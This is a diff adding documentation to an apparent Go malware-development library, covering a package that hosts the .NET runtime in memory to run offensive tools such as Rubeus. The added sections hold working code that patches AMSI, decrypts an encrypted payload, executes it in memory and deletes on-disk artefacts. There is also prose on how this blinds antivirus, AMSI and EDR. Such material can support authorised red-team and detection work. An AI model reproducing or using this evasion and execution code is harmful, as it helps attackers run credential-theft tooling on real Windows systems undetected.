@@ -2,6 +2,19 @@
 
 [<- Back to PE Operations](README.md)
 
+**MITRE ATT&CK:** [T1620 - Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)
+**Package:** `pe/clr`
+**Platform:** Windows only
+**Detection:** Medium
+
+---
+
+## For Beginners
+
+Lots of offensive tooling ships as .NET (Rubeus, SharpHound, Seatbelt). `pe/clr` loads the .NET runtime inside your Go process and executes that tooling from memory — no `powershell.exe`, no `InstallUtil.exe`, no child process for the defender to scope.
+
+---
+
 ## What It Does
 
 Loads the .NET Common Language Runtime in the current process and executes
@@ -103,6 +116,34 @@ If either requirement is missing, `Load` returns
 `ErrLegacyRuntimeUnavailable`. `InstalledRuntimes()` always works and is
 useful for target profiling.
 
+## Usage
+
+```go
+import "github.com/oioio-space/maldev/pe/clr"
+
+// One-time: write <exe>.config so legacy v2 activation policy is honoured.
+_ = clr.InstallRuntimeActivationPolicy()
+
+rt, err := clr.Load(nil) // nil caller = WinAPI
+if err != nil {
+    // errors.Is(err, clr.ErrLegacyRuntimeUnavailable) if v2 CLR missing
+    panic(err)
+}
+defer rt.Close()
+
+// Execute a .NET EXE from memory.
+assembly, _ := os.ReadFile("Rubeus.exe")
+_ = rt.ExecuteAssembly(assembly, []string{"triage"})
+
+// Or a DLL:
+// rt.ExecuteDLL(dllBytes, "Namespace.TypeName", "MethodName", "arg")
+
+// Remove the config artefact — runtime keeps working, disk evidence gone.
+_ = clr.RemoveRuntimeActivationPolicy()
+```
+
+---
+
 ## Recommended Usage — with OPSEC cleanup
 
 ```go
@@ -140,6 +181,72 @@ func main() {
 	_ = rt.ExecuteAssembly(assembly, []string{"asktgt", "/user:admin"})
 }
 ```
+
+---
+
+## Combined Example
+
+Ship the .NET assembly to the target AES-GCM-encrypted, decrypt it in
+memory, and hand the plaintext directly to `rt.ExecuteAssembly` — the
+payload never exists unencrypted on disk and `AppDomain.Load_3` sees
+it only after AMSI has been blinded.
+
+```go
+package main
+
+import (
+    "log"
+    "os"
+
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/evasion/amsi"
+    "github.com/oioio-space/maldev/pe/clr"
+)
+
+func main() {
+    // 1. Blind AMSI before any managed code touches AmsiScanBuffer.
+    _ = amsi.PatchAll(nil)
+
+    // 2. Ensure the legacy v2 activation policy is in place.
+    if err := clr.InstallRuntimeActivationPolicy(); err != nil {
+        log.Fatal(err)
+    }
+
+    // 3. Read the AES-GCM blob (embedded via //go:embed or dropped
+    //    by a stager). The key is a build-time constant or derived
+    //    from a C2 handshake — never stored alongside the blob.
+    key := mustLoadKey()
+    blob, err := os.ReadFile("payload.bin") // AES-GCM ciphertext
+    if err != nil {
+        log.Fatal(err)
+    }
+    assembly, err := crypto.DecryptAESGCM(key, blob)
+    if err != nil {
+        log.Fatal(err) // integrity failure aborts cleanly
+    }
+
+    // 4. Load CLR and execute the decrypted assembly.
+    rt, err := clr.Load(nil)
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer rt.Close()
+    _ = clr.RemoveRuntimeActivationPolicy() // delete config artefact
+
+    _ = rt.ExecuteAssembly(assembly, []string{"triage", "/quiet"})
+}
+
+func mustLoadKey() []byte { /* ... */ return nil }
+```
+
+Layered benefit: the on-disk artefact is ciphertext (static YARA/AV
+gets nothing), AMSI is silenced before any managed buffer hits
+`AmsiScanBuffer` (defender's in-memory scan blinded), and the `.config`
+file is removed between `Load()` and payload execution (EDR minifilter
+sees the file appear and disappear in the same second, with no managed
+code to connect it to).
+
+---
 
 ## OPSEC Notes
 
@@ -215,3 +322,9 @@ spot it; a signature-only stack typically won't.
 
 - [ropnop/go-clr](https://github.com/ropnop/go-clr) — vtable layouts and
   flow reference.
+
+---
+
+## API Reference
+
+See [pe.md](../../pe.md#peclr----in-process-net-clr-hosting)
